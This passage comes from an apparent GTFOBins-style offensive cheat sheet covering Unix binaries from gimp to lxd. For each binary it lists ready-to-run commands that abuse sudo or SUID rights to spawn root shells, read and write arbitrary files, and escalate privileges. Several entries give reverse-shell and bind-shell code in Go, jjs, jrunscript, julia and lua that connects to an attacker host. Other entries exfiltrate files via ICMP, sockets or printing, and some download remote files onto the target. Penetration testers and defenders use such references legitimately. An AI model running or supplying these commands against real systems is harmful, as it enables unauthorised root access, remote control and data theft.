-->

## gimp

### gimp inherit (inherits from python)

This allows to run Python code (`...`). It hangs afterwards and can be terminated by pressing `Ctrl-C`.

```sh title:"sudo / unprivileged"
gimp -idf --batch-interpreter=python-fu-eval -b '...'
```
<!-- cheat
-->

## ginsh

### ginsh shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
ginsh
!/bin/sh
```
<!-- cheat
-->

## git

### git shell #1

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
```
<!-- cheat
-->

### git shell #2

Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used, and moving into the directory works too.

```sh title:"sudo / unprivileged"
git init .
echo 'exec /bin/sh 0<&2 1>&2' >.git/hooks/pre-commit
chmod +x .git/hooks/pre-commit
git -C . commit --allow-empty -m x
```
<!-- cheat
-->

### git shell #3

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
ln -s /bin/sh git-x
git --exec-path=. x
```
<!-- cheat
-->

#### git shell #3 - suid override

```sh title:"suid variant"
ln -s /bin/sh git-x
git --exec-path=. x -p
```
<!-- cheat
-->

### git file-read

The read file content is displayed in `diff` style output format.

```sh title:"sudo / suid / unprivileged"
git diff /dev/null $file_in
```
<!-- cheat
var file_in
-->

### git file-write

The patch can be created locally by creating the file that will be written on the target using its absolute path:  ``` echo $data >$file_in git diff /dev/null $file_in >x.patch ```

```sh title:"sudo / suid / unprivileged"
git apply --unsafe-paths --directory / x.patch
```
<!-- cheat
-->

### git inherit #1 (inherits from less)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / unprivileged"
git help config
```
<!-- cheat
-->

### git inherit #2 (inherits from less)

The help system can also be reached from any `git` command, e.g., `git branch`.

```sh title:"sudo / unprivileged"
git branch --help config
!/bin/sh
```
<!-- cheat
-->

## gnuplot

### gnuplot shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
gnuplot -e 'system("/bin/sh 1>&0")'
```
<!-- cheat
-->

## go

### go shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
echo -e 'package main\nimport "syscall"\nfunc main(){\n\tsyscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, []string{})\n}' >$tmp_file
go run $tmp_file
```
<!-- cheat
var tmp_file
-->

### go reverse-shell

Connect back to an attacker-controlled listener.

```sh title:"sudo / unprivileged"
echo -e 'package main\nimport (\n\t"os"\n\t"net"\n\t"syscall"\n)\n\nfunc main(){\n\tfd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\n\tip := net.ParseIP("$lhost").To4()\n\taddr := &syscall.SockaddrInet4{Port: $lport}\n\tcopy(addr.Addr[:], ip)\n\tsyscall.Connect(fd, addr)\n\tsyscall.Dup2(fd, 0)\n\tsyscall.Dup2(fd, 1)\n\tsyscall.Dup2(fd, 2)\n\tsyscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, os.Environ())\n}' >$tmp_file
go run $tmp_file
```
<!-- cheat
import tun_ip
import lports
var tmp_file
-->

### go bind-shell

Bind a shell to a local port for the attacker to connect to.

```sh title:"sudo / unprivileged"
echo -e 'package main\nimport (\n\t"os"\n\t"syscall"\n)\n\nfunc main(){\n\tfd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\n\taddr := &syscall.SockaddrInet4{Port: $lport}\n\tcopy(addr.Addr[:], []byte{0,0,0,0})\n\tsyscall.Bind(fd, addr)\n\tsyscall.Listen(fd, 1)\n\tnfd, _, _ := syscall.Accept(fd)\n\tsyscall.Dup2(nfd, 0)\n\tsyscall.Dup2(nfd, 1)\n\tsyscall.Dup2(nfd, 2)\n\tsyscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, os.Environ())\n}' >$tmp_file
go run $tmp_file
```
<!-- cheat
import lports
var tmp_file
-->

### go file-read

Read the contents of an arbitrary file.

```sh title:"sudo / unprivileged"
echo -e 'package main\nimport (\n\t"fmt"\n\t"os"\n)\n\nfunc main(){\n\tb, _ := os.ReadFile("$file_in")\n\tfmt.Print(string(b))\n}' >$tmp_file
go run $tmp_file
```
<!-- cheat
var file_in
var tmp_file
-->

### go file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / unprivileged"
echo -e 'package main\nimport "os"\nfunc main(){\n\tf, _ := os.OpenFile("$file_out", os.O_RDWR|os.O_CREATE, 0644)\n\tf.Write([]byte("$data\\n"))\n\tf.Close()\n}' >$tmp_file
go run $tmp_file
```
<!-- cheat
var data
var file_out
var tmp_file
-->

## grc

### grc shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
grc --pty /bin/sh
```
<!-- cheat
-->

## grep

### grep file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
grep '' $file_in
```
<!-- cheat
var file_in
-->

## gtester

### gtester shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
echo 'exec /bin/sh 0<&1' >$tmp_file
chmod +x $tmp_file
gtester -q $tmp_file
```
<!-- cheat
var tmp_file
-->

#### gtester shell - suid override

```sh title:"suid variant"
echo '#!/bin/sh -p' >$tmp_file
echo 'exec /bin/sh -p 0<&1' >>$tmp_file
chmod +x $tmp_file
gtester -q $tmp_file
```
<!-- cheat
var tmp_file
-->

### gtester file-write

Data to be written appears in an XML attribute in the output file (`<testbinary path="$data">`).

```sh title:"sudo / suid / unprivileged"
gtester $data -o $file_out
```
<!-- cheat
var data
var file_out
-->

## guile

### guile shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
guile -c '(system "/bin/sh")'
```
<!-- cheat
-->

## gzip

There are also a number of other utilities that rely on `gzip` under the hood, e.g., `zless`, `zcat`, `gunzip`, etc. Besides having similar features, they also allow privileged reads if `gzip` itself is SUID.

### gzip file-read

Read the contents of an arbitrary file.

```sh title:"capabilities / sudo / suid / unprivileged"
gzip -c $file_in | gzip -d
```
<!-- cheat
var file_in
-->

## hashcat

### hashcat file-write

Append data to the end of the output file, creating if does not exist.

```sh title:"sudo / unprivileged"
echo -n $data | tee $wordlist | md5sum | awk '{print $1}' >$hash_file
hashcat -m 0 --quiet --potfile-disable -o $file_out --outfile-format=2 --outfile-autohex-disable $hash_file $wordlist
```
<!-- cheat
var data
var file_out
var hash_file
var wordlist
-->

## hd

Alias of [hexdump](#hexdump). All techniques from `hexdump` apply.

## head

### head file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
head -c-0 $file_in
```
<!-- cheat
var file_in
-->

## hexdump

### hexdump file-read

The output is actually an hex dump.

```sh title:"sudo / suid / unprivileged"
hd $file_in
```
<!-- cheat
var file_in
-->

## hg

### hg shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
hg --config alias.x='!/bin/sh' x
```
<!-- cheat
-->

## highlight

### highlight file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
highlight --no-doc --failsafe $file_in
```
<!-- cheat
var file_in
-->

## hping3

### hping3 shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
hping3
/bin/sh
```
<!-- cheat
-->

#### hping3 shell - suid override

```sh title:"suid variant"
hping3
/bin/sh -p
```
<!-- cheat
-->

### hping3 upload

The file is continuously sent as ICMP packets (e.g., of `999` bytes), the optional `--end` parameter signals when the file reached the end.

```sh title:"sudo"
hping3 $lhost --icmp --data 999 --sign xxx --file $file_in
```
<!-- cheat
import tun_ip
var file_in
-->

## iconv

The `8859_1` encoding is used as it accepts any single-byte sequence, thus it allows to read/write arbitrary files. Other encoding combinations may corrupt the result.

### iconv file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
iconv -f 8859_1 -t 8859_1 $file_in
```
<!-- cheat
var file_in
-->

### iconv file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / suid / unprivileged"
echo $data | iconv -f 8859_1 -t 8859_1 -o $file_out
```
<!-- cheat
var data
var file_out
-->

## iftop

### iftop shell

This requires the privilege to capture on some device (specify with `-i` if needed).

```sh title:"sudo / suid / unprivileged"
iftop
!/bin/sh
```
<!-- cheat
-->

## install

### install privilege-escalation

This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a file.

```sh title:"sudo / suid"
install -m 6777 $file_in $dir_out/
```
<!-- cheat
var dir_out
var file_in
-->

## ionice

### ionice shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
ionice /bin/sh
```
<!-- cheat
-->

#### ionice shell - suid override

```sh title:"suid variant"
ionice /bin/sh -p
```
<!-- cheat
-->

## ip

### ip shell #1

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid"
ip netns add foo
ip netns exec foo /bin/sh
ip netns delete foo
```
<!-- cheat
-->

#### ip shell #1 - suid override

```sh title:"suid variant"
ip netns add foo
ip netns exec foo /bin/sh -p
ip netns delete foo
```
<!-- cheat
-->

### ip shell #2

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo"
ip netns add foo
ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar
ip netns exec bar /bin/sh
ip netns delete foo
ip netns delete bar
```
<!-- cheat
-->

### ip file-read

The read file content is corrupted by error prints.

```sh title:"sudo / suid / unprivileged"
ip -force -batch $file_in
```
<!-- cheat
var file_in
-->

## iptables-save

### iptables-save file-write

The content is written along with a number of `iptables` rules.

```sh title:"sudo"
iptables -A INPUT -i lo -j ACCEPT -m comment --comment $data
iptables -S
iptables-save -f $file_out
```
<!-- cheat
var data
var file_out
-->

## irb

### irb inherit (inherits from ruby)

This allows to run Ruby code (`...`).

```sh title:"sudo / unprivileged"
irb
...
```
<!-- cheat
-->

## ispell

### ispell shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
ispell /etc/hosts
!/bin/sh
```
<!-- cheat
-->

#### ispell shell - suid override

```sh title:"suid variant"
ispell /etc/hosts
!/bin/sh -p
```
<!-- cheat
-->

## java

### java shell

The `Shell.class` class file can be compiled offline, then uploaded to the target:  ``` cat >Shell.java <<EOF public class Shell {     public static void main(String[] args) throws Exception {         new ProcessBuilder("/bin/sh").inheritIO().start().waitFor();     } } EOF  javac Shell.java ```

```sh title:"sudo / unprivileged"
java Shell
```
<!-- cheat
-->

## jjs

This tool is installed starting with Java SE 8.

### jjs shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
jjs
Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty').waitFor()
```
<!-- cheat
-->

### jjs reverse-shell

Connect back to an attacker-controlled listener.

```sh title:"sudo / unprivileged"
jjs
var host='$lhost';
var port=$lport;
var ProcessBuilder = Java.type('java.lang.ProcessBuilder');
var p=new ProcessBuilder('/bin/sh', '-i').redirectErrorStream(true).start();
var Socket = Java.type('java.net.Socket');
var s=new Socket(host,port);
var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type('java.lang.Thread').sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();
```
<!-- cheat
import tun_ip
import lports
-->

### jjs file-read

Read the contents of an arbitrary file.

```sh title:"sudo / unprivileged"
jjs
var BufferedReader = Java.type('java.io.BufferedReader');
var FileReader = Java.type('java.io.FileReader');
var br = new BufferedReader(new FileReader('$file_in'));
while ((line = br.readLine()) != null) { print(line); }
```
<!-- cheat
var file_in
-->

### jjs file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / unprivileged"
jjs
var FileWriter = Java.type('java.io.FileWriter');
var fw=new FileWriter('$file_out');
fw.write('$data');
fw.close();
```
<!-- cheat
var data
var file_out
-->

### jjs download

Pull a remote file to disk.

```sh title:"sudo / unprivileged"
jjs
var URL = Java.type('java.net.URL');
var ws = new URL('$scheme://$lhost$file_in');
var Channels = Java.type('java.nio.channels.Channels');
var rbc = Channels.newChannel(ws.openStream());
var FileOutputStream = Java.type('java.io.FileOutputStream');
var fos = new FileOutputStream('$file_out');
fos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);
fos.close();
rbc.close();
```
<!-- cheat
import tun_ip
import scheme
var file_in
var file_out
-->

## joe

### joe shell

The terminal is spawn int the terminal interface.

```sh title:"sudo / suid / unprivileged"
joe
^K!/bin/sh
```
<!-- cheat
-->

## join

### join file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
join -a 2 /dev/null $file_in
```
<!-- cheat
var file_in
-->

## journalctl

This might not work if run by unprivileged users depending on the system configuration.

### journalctl inherit (inherits from less)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / unprivileged"
journalctl
```
<!-- cheat
-->

## jq

### jq file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
jq -Rr . $file_in
```
<!-- cheat
var file_in
-->

## jrunscript

This tool is installed starting with Java SE 6.

### jrunscript shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
jrunscript -e 'exec("/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty")'
```
<!-- cheat
-->

#### jrunscript shell - suid override

This has been found working in macOS but failing on Linux systems.

```sh title:"suid variant"
jrunscript -e 'exec("/bin/sh -pc $@|sh${IFS}-p _ echo sh -p </dev/tty >/dev/tty 2>/dev/tty")'
```
<!-- cheat
-->

### jrunscript reverse-shell

Connect back to an attacker-controlled listener.

```sh title:"sudo / unprivileged"
jrunscript -e 'var host="$lhost";
    var port=$lport;
    var p=new java.lang.ProcessBuilder("/bin/sh", "-i").redirectErrorStream(true).start();
    var s=new java.net.Socket(host,port);
    var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
    var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){
    while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());
    so.flush();po.flush();
    java.lang.Thread.sleep(50);
    try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'
```
<!-- cheat
import tun_ip
import lports
-->

### jrunscript file-read

Read the contents of an arbitrary file.

```sh title:"sudo / unprivileged"
jrunscript -e 'br = new BufferedReader(new java.io.FileReader("$file_in"));
    while ((line = br.readLine()) != null) { print(line); }'
```
<!-- cheat
var file_in
-->

### jrunscript file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / unprivileged"
jrunscript -e 'var fw=new java.io.FileWriter("$file_out");
    fw.write("$data");
    fw.close();'
```
<!-- cheat
var data
var file_out
-->

### jrunscript download

Pull a remote file to disk.

```sh title:"sudo / unprivileged"
jrunscript -e 'cp("$scheme://$lhost$file_in","$file_out")'
```
<!-- cheat
import tun_ip
import scheme
var file_in
var file_out
-->

## jshell

### jshell shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
jshell
Runtime.getRuntime().exec("$cmd_file");
```
<!-- cheat
var cmd_file
-->

### jshell file-read

The content is leaked as error messages.

```sh title:"sudo / unprivileged"
jshell
jshell> /open $file_in
```
<!-- cheat
var file_in
-->

### jshell file-write

Writes only the valid Java code to file.

```sh title:"sudo / unprivileged"
jshell
String x = "$data";
/save $file_out
```
<!-- cheat
var data
var file_out
-->

## jtag

### jtag shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
jtag --interactive
shell /bin/sh
```
<!-- cheat
-->

## julia

### julia shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
julia -e 'run(`/bin/sh`)'
```
<!-- cheat
-->

#### julia shell - suid override

```sh title:"suid variant"
julia -e 'run(`/bin/sh -p`)'
```
<!-- cheat
-->

### julia reverse-shell

Connect back to an attacker-controlled listener.

```sh title:"sudo / suid / unprivileged"
julia -e 'using Sockets; sock=connect("$lhost", parse(Int64, $lport)); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'
```
<!-- cheat
import tun_ip
import lports
-->

### julia file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
julia -e 'print(open(f->read(f, String), "$file_in"))'
```
<!-- cheat
var file_in
-->

### julia file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / suid / unprivileged"
julia -e 'open(f->write(f, "$data"), $file_out, "w")'
```
<!-- cheat
var data
var file_out
-->

### julia download

Pull a remote file to disk.

```sh title:"sudo / suid / unprivileged"
julia -e 'download("$scheme://$lhost$file_in", "$file_out")'
```
<!-- cheat
import tun_ip
import scheme
var file_in
var file_out
-->

## knife

### knife inherit (inherits from ruby)

This allows to run Ruby code (`...`).

```sh title:"sudo / unprivileged"
knife exec -E '...'
```
<!-- cheat
-->

## ksh

Alias of [bash](#bash). All techniques from `bash` apply.

## ksshell

### ksshell file-read

Each line is corrupted by a prefix string. Also consider that lines are actually parsed as `kickstart` scripts thus some file contents may lead to unexpected results.

```sh title:"sudo / suid / unprivileged"
ksshell -i $file_in
```
<!-- cheat
var file_in
-->

## ksu

### ksu shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo"
ksu -q -e /bin/sh
```
<!-- cheat
-->

## kubectl

### kubectl shell

The shell is spawn multiple times.

```sh title:"sudo / unprivileged"
cat >$tmp_file <<EOF
clusters:
- cluster:
    server: https://x
  name: x
contexts:
- context:
    cluster: x
    user: x
  name: x
current-context: x
users:
- name: x
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      interactiveMode: Always
      command: /bin/sh
      args:
        - '-c'
        - '/bin/sh 0<&2 1>&2'
EOF

kubectl get pods --kubeconfig=$tmp_file
```
<!-- cheat
var tmp_file
-->

### kubectl upload

Push a local file to a remote receiver.

```sh title:"sudo / suid / unprivileged"
kubectl proxy --address=0.0.0.0 --port=$lport --www=$dir/ --www-prefix=/x/
```
<!-- cheat
import lports
var dir
-->

## last

### last file-read

The output might be corrupted or incomplete if the file does not follow the expected database format.

```sh title:"sudo / suid / unprivileged"
last -a -f $file_in
```
<!-- cheat
var file_in
-->

## lastb

Alias of [last](#last). All techniques from `last` apply.

## latex

### latex shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
latex --shell-escape '\immediate\write18{/bin/sh}'
```
<!-- cheat
-->

### latex file-read

The read file will be part of the PDF output.

```sh title:"sudo / suid / unprivileged"
latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{$file_in}\end{document}'
strings texput.dvi
```
<!-- cheat
var file_in
-->

### latex file-write

The file can only be written in the current directory, and the `.tex` extension is mandatory.

```sh title:"sudo / suid / unprivileged"
latex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{$data}\immediate\closeout\tempfile\end{document}'
```
<!-- cheat
var data
-->

## latexmk

### latexmk shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
latexmk -pdf -pdflatex='/bin/sh #' /dev/null
```
<!-- cheat
-->

### latexmk file-read

The read file will be part of the output.

```sh title:"sudo / unprivileged"
echo '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{$file_in}\end{document}' >$tmp_file
latexmk -dvi $tmp_file
strings temp-file.dvi
```
<!-- cheat
var file_in
var tmp_file
-->

### latexmk inherit (inherits from perl)

This allows to run Perl code (`...`).

```sh title:"sudo / unprivileged"
latexmk -e '...'
```
<!-- cheat
-->

## ld.so

`ld.so` is the Linux dynamic linker/loader, its filename and location might change across distributions (e.g., `/lib64/ld-linux-x86-64.so.2`). The actual path is can be obtained with:  ``` strings /proc/self/exe | head -1 ```

### ld.so shell

The spawned process will be the loader, not the target executable, this might aid evasion. See <https://shyft.us/posts/20230526_linux_command_proxy.html> for more information.

```sh title:"sudo / suid / unprivileged"
$ld_so /bin/sh
```
<!-- cheat
var ld_so
-->

#### ld.so shell - suid override

```sh title:"suid variant"
$ld_so /bin/sh -p
```
<!-- cheat
var ld_so
-->

## ldconfig

### ldconfig library-load

This allows to override one or more shared libraries (e.g., `libpcap`) globally, then triggers the execution by running a program that uses it, e.g., `ping`. This is particularly useful if the target binary is SUID. Beware though that it is easy to end up with a broken target system.  First identify the shared libraries used by the target program, for example:  ``` $ ldd /bin/ping | grep libcap         libcap.so.2 => $tmp_dir/libcap.so.2 (0x00007f8417eef000) ```  Then create the shared library override, named `libcap.so.2`, and put in in `$tmp_dir/`. The program might require some exported symbols from the library override, in that case make sure to add them (e.g., `void cap_get_flag() {}`).

```sh title:"sudo / suid / unprivileged"
echo $tmp_dir/ >$tmp_file
ldconfig -f $tmp_file
ping
```
<!-- cheat
var tmp_dir
var tmp_file
-->

## less

### less shell #1

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
less /etc/hosts
!/bin/sh
```
<!-- cheat
-->

### less shell #2

The optional `reset` command is needed to receive the echo back of the typed keystrokes.

```sh title:"sudo / unprivileged"
LESSOPEN="/bin/sh -s 1>&0 2>&0 # %s" less /etc/hosts
reset
```
<!-- cheat
-->

### less shell #3

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
VISUAL='/bin/sh -s --' less /etc/hosts
v
```
<!-- cheat
-->

### less command #1

Execute an arbitrary non-interactive command.

```sh title:"unprivileged"
cp $cmd_file ~/.lessfilter
less /etc/hosts
```
<!-- cheat
var cmd_file
-->

### less command #2

Execute an arbitrary non-interactive command.

```sh title:"sudo / unprivileged"
LESSOPEN='$cmd_file # %s' less /etc/hosts
```
<!-- cheat
var cmd_file
-->

### less file-read #1

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
less $file_in
```
<!-- cheat
var file_in
-->

### less file-read #2

This can be used to read another file, e.g., when invoked as a pager with some fixed content.

```sh title:"sudo / suid / unprivileged"
less /etc/hosts
:e $file_in
```
<!-- cheat
var file_in
-->

### less file-read #3

This can be used to read another file.

```sh title:"sudo / unprivileged"
LESSOPEN='echo $file_in # %s' less /etc/hosts
```
<!-- cheat
var file_in
-->

### less file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / suid / unprivileged"
echo $data | less
s$file_out
q
```
<!-- cheat
var data
var file_out
-->

### less inherit (inherits from vi)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / suid / unprivileged"
less /etc/hosts
v
```
<!-- cheat
-->

## lftp

### lftp shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
lftp -c '!/bin/sh'
```
<!-- cheat
-->

## links

### links file-read

The result is displayed in a TUI interface.

```sh title:"sudo / suid / unprivileged"
links $file_in
```
<!-- cheat
var file_in
-->

## ln

### ln privilege-escalation

This overrides `ln` itself with a symlink to a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `ln` by path. Warning, this is a destructive action.

```sh title:"sudo"
ln -fs /bin/sh /bin/ln
ln
```
<!-- cheat
-->

## loginctl

This might not work if run by unprivileged users depending on the system configuration.

### loginctl shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
loginctl user-status
!/bin/sh
```
<!-- cheat
-->

## logrotate

### logrotate shell

This command is picky about file permissions. An existing config file can be used as weel, provided that it contains a mail directive.

```sh title:"sudo"
echo -e '$tmp_file {\nmail x@x.x\n}' >$tmp_file
echo '/bin/sh 0<&2 1>&2' >$tmp_file
logrotate -m $tmp_file -f $tmp_file
```
<!-- cheat
var tmp_file
-->

### logrotate file-read

The first word is returned in a error message.

```sh title:"sudo / suid / unprivileged"
logrotate $file_in
```
<!-- cheat
var file_in
-->

### logrotate file-write

The content is written in a log file.

```sh title:"sudo / suid / unprivileged"
logrotate -l $file_out $data
```
<!-- cheat
var data
var file_out
-->

## logsave

### logsave shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
logsave /dev/null /bin/sh -i
```
<!-- cheat
-->

#### logsave shell - suid override

```sh title:"suid variant"
logsave /dev/null /bin/sh -i -p
```
<!-- cheat
-->

## look

### look file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
look '' $file_in
```
<!-- cheat
var file_in
-->

## lp

### lp upload

This requires `cups` to be installed. Run the following on the attacker box beforehand:  1. `lpadmin -p printer -v socket://localhost -E` to create a virtual printer; 2. `lpadmin -d printer` to set the new printer as default; 3. `cupsctl --remote-any` to enable printing from the Internet.

```sh title:"sudo / suid / unprivileged"
lp $file_in -h $lhost
```
<!-- cheat
import tun_ip
var file_in
-->

## ltrace

### ltrace shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
ltrace -b -L /bin/sh
```
<!-- cheat
-->

### ltrace file-read

The file is parsed as a configuration file and its content is shown as error messages.

```sh title:"sudo / suid / unprivileged"
ltrace -F $file_in /dev/null
```
<!-- cheat
var file_in
-->

### ltrace file-write

The data to be written appears amid the library function call log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough instead of `999`. More generally, any binary that executes whatever library function call passing arbitrary data can be used in place of `ltrace -F $data`.

```sh title:"sudo / unprivileged"
ltrace -s 999 -o $file_in ltrace -F $data
```
<!-- cheat
var data
var file_in
-->

## lua

### lua shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
lua -e 'os.execute("/bin/sh")'
```
<!-- cheat
-->

### lua reverse-shell

This requires `lua-socket` to be available.

```sh title:"sudo / suid / unprivileged"
lua -e '
  local s=require("socket");
  local t=assert(s.tcp());
  t:connect("$lhost",$lport);
  while true do
    local r,x=t:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));t:send(b);
  end;
  f:close();t:close();'
```
<!-- cheat
import tun_ip
import lports
-->

### lua bind-shell

This requires `lua-socket` to be available.

```sh title:"sudo / suid / unprivileged"
lua -e '
  local k=require("socket");
  local s=assert(k.bind("*",$lport));
  local c=s:accept();
  while true do
    local r,x=c:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));c:send(b);
  end;c:close();f:close();'
```
<!-- cheat
import lports
-->

### lua file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
lua -e 'local f=io.open("$file_in", "rb"); io.write(f:read("*a")); io.close(f);'
```
<!-- cheat
var file_in
-->

### lua file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / suid / unprivileged"
lua -e 'local f=io.open("$file_out", "wb"); f:write("$data"); io.close(f);'
```
<!-- cheat
var data
var file_out
-->

### lua download

This requires `lua-socket` to be available.

```sh title:"sudo / suid / unprivileged"
lua -e '
  local k=require("socket");
  local s=assert(k.bind("*",$lport));
  local c=s:accept();
  local d,x=c:receive("*a");
  c:close();
  local f=io.open("$file_out", "wb");
  f:write(d);
  io.close(f);'
```
<!-- cheat
import lports
var file_out
-->

### lua upload

This requires `lua-socket` to be available.

```sh title:"sudo / suid / unprivileged"
lua -e '
  local f=io.open("$file_in", "rb")
  local d=f:read("*a")
  io.close(f);
  local s=require("socket");
  local t=assert(s.tcp());
  t:connect("$lhost",$lport);
  t:send(d);
  t:close();'
```
<!-- cheat
import tun_ip
import lports
var file_in
-->

## lualatex

### lualatex inherit (inherits from lua)

This allows to run Lua code (`...`).

```sh title:"sudo / suid / unprivileged"
lualatex -shell-escape '\directlua{...}\end'
```
<!-- cheat
-->

## luatex

### luatex inherit (inherits from lua)

This allows to run Lua code (`...`).

```sh title:"sudo / suid / unprivileged"
luatex -shell-escape '\directlua{...}\end'
```
<!-- cheat
-->

## lwp-download

### lwp-download file-read

Read the contents of an arbitrary file.

```sh title:"sudo / unprivileged"
lwp-download file://$file_in /dev/stdout
```
<!-- cheat
var file_in
-->

### lwp-download file-write #1

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / unprivileged"
echo $data >$tmp_file
lwp-download file://$tmp_file $file_out
```
<!-- cheat
var data
var file_out
var tmp_file
-->

### lwp-download file-write #2

This actually copies a file to a destination.

```sh title:"sudo / unprivileged"
lwp-download file://$file_in $file_out
```
<!-- cheat
var file_in
var file_out
-->

### lwp-download download

The destination file `$file_out` can be omitted, in that case the file is saved to `input-file` in the current working directory.

```sh title:"sudo / unprivileged"
lwp-download $scheme://$lhost$file_in $file_out
```
<!-- cheat
import tun_ip
import scheme
var file_in
var file_out
-->

## lwp-request

### lwp-request file-read

Read the contents of an arbitrary file.

```sh title:"sudo / unprivileged"
lwp-request file://$file_in
```
<!-- cheat
var file_in
-->

## lxd

### lxd shell #1

The image (e.g., `ubuntu:16.04`) must be present already, otherwise it will be downloaded.

```sh title:"sudo / suid"
lxc init ubuntu:16.04 x -c security.privileged=true
lxc config device add x x disk source=/ path=/mnt/ recursive=true
lxc start x
lxc exec x /bin/sh
```
<!-- cheat
-->

### lxd shell #2

